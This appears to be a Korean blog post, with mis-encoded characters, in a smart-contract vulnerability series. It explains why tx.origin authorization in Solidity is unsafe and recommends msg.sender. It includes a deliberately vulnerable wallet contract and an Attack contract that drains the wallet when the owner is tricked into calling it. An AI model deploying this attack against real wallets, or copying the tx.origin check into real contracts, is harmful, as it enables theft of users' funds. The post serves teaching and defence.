---
emoji: ðŸ§¢
title: (ì·¨ì•½ì  ì‹œë¦¬ì¦ˆ 8) tx.origin
date: '2022-01-03 02:57:00'
author: í•œì„±ì›
tags: tx.origin ì·¨ì•½ì  SmartContract vulnerability
categories: ì·¨ì•½ì ë¶„ì„
---


# ðŸ‘‹ tx.origin

## txorigin vs msg.sender
ì£¼ë¡œ tx.originì€ msg.senderê³¼ ë¹„êµëœë‹¤.   
ìš°ì„  ìš°ë¦¬ê°€ ìž˜ ì•„ëŠ” msg.senderëŠ” í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•œ ì‚¬ëžŒì„ ê°€ë¦¬í‚¤ëŠ” ì£¼ì†Œì´ë‹¤.
tx.originì„ ë³´ë©´ txëŠ” transactionì„ ëœ»í•œë‹¤. ì¦‰ transactionì„ ë§Œë“  addressë¥¼ ëœ»í•œë‹¤.

ë§Œì•½ accountì—ì„œ smart contract Aë¡œ transactionì„ ë³´ë‚¸ë‹¤ë©´ msg.senderì™€ tx.originì€ ê°™ì„ ê²ƒì´ë‹¤. ì™œëƒí•˜ë©´ transactionì„ ë§Œë“ ì´ì™€ transactionì„ ë³´ë‚¸ ì‚¬ëžŒì´ ê°™ê¸° ë•Œë¬¸ì´ë‹¤.

ê·¸ë ‡ë‹¤ë©´ account -> smart contract A -> smart contract B ìˆœìœ¼ë¡œ transactionì„ ë³´ë‚¸ë‹¤ë©´ ì–´ë–»ê²Œ ë ê¹Œ? Bì˜ ê´€ì ì—ì„œ ë³¸ë‹¤ë©´ transactionì„ ë§Œë“ ì´ëŠ” accountì´ê³  msg.senderì€ Aì¼ ê²ƒì´ë‹¤.
ë°‘ì— ì‚¬ì§„ì„ ë³¸ë‹¤ë©´ ì´í•´ê°€ ë” ì‰¬ìš¸ ê²ƒì´ë‹¤. 
![tx.origin_vs_msg.sender](./txorigin_vs_msg.sender.png)

- - -

## Example Code
ì´ Example CodeëŠ” solidity docsì— ë‚˜ì™€ìžˆëŠ” ë‚´ìš©ì´ë‹¤!
```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;
// THIS CONTRACT CONTAINS A BUG - DO NOT USE
contract TxUserWallet {
    address owner;

    constructor() {
        owner = msg.sender;
    }

    function transferTo(address payable dest, uint amount) public {
        // THE BUG IS RIGHT HERE, you must use msg.sender instead of tx.origin
        require(tx.origin == owner);
        dest.transfer(amount);
    }
}
```
```
contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        require(tx.origin == owner, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}
```
ì‹œë‚˜ë¦¬ì˜¤ëŠ” ì´ë ‡ë‹¤.
1. Aê°€ 10 Etherì™€ í•¨ê»˜ Wallet contractë¥¼ ë°°í¬í•œë‹¤.
2. Bê°€ Attack contractë¥¼ Wallet contractì˜ ì£¼ì†Œì™€ í•¨ê¼ ë°°í¬í•œë‹¤.
3. Aê°€ Attack contractì˜ attack()ì„ callí•œë‹¤.
4. BëŠ” Aliceì˜ Etherë¥¼ ë‹¤ ê°€ì ¸ì˜¤ê²Œ ëœë‹¤. 

"ëˆ„ê°€ ì†ì•„ì„œ attack()ì„ callí•´!" í•  ìˆ˜ ìžˆì§€ë§Œ ì¶©ë¶„ížˆ ì¼ì–´ë‚  ìˆ˜ ìžˆë‹¤ê³  ìƒê°ëœë‹¤.
- - -

## How to prevent?
solidity docsì—ì„œë„ tx.originì„ authorization ì‚¬ìš©í•˜ì§€ ì•Šì„ ê²ƒì„ ê¶Œìž¥í•˜ê³  ìžˆë‹¤. ë˜í•œ tx.originì€ ì‚¬ë¼ì§ˆ ìˆ˜ë„ ìžˆë‹¤ê³  í•œë‹¤! ê·¸ëŸ¬ë‹ˆ ì•žìœ¼ë¡œ msg.senderë¥¼ ì‚¬ìš©í•˜ë„ë¡ í•˜ìž

```
Besides the issue with authorization, there is a chance that tx.origin will be removed from the Ethereum protocol in the future, so code that uses tx.origin won't be compatible with future releases Vitalik: 'Do NOT assume that tx.origin will continue to be usable or meaningful.'
```
- - -

## ë§ˆë¬´ë¦¬
ì •ë§ ê°„ë‹¨í•˜ê²Œ ê³ ì¹  ìˆ˜ ìžˆëŠ” ë¶€ë¶„ì´ë¼ê³  ìƒê°ì´ ë“ ë‹¤. ê·¸ë¦¬ê³  ë™ì‹œì— ì´ëŸ° ì‚¬ì†Œí•œ ì‹¤ ìˆ˜ í•˜ë‚˜ê°€ í° ì˜í–¥ì„ ë¯¸ì¹  ìˆ˜ ìžˆë‹¤ëŠ” ê²ƒì´ ë†€ëžë‹¤. ì•žìœ¼ë¡œ tx.origin ë§ê³  msg.senderë¥¼ ê¼­ ì‚¬ìš©í•˜ìž!!!


### Reference
- https://davidkathoh.medium.com/tx-origin-vs-msg-sender-93db7f234cb9
- https://solidity-by-example.org/hacks/phishing-with-tx-origin/
- https://docs.soliditylang.org/en/v0.8.10/security-considerations.html
```toc

```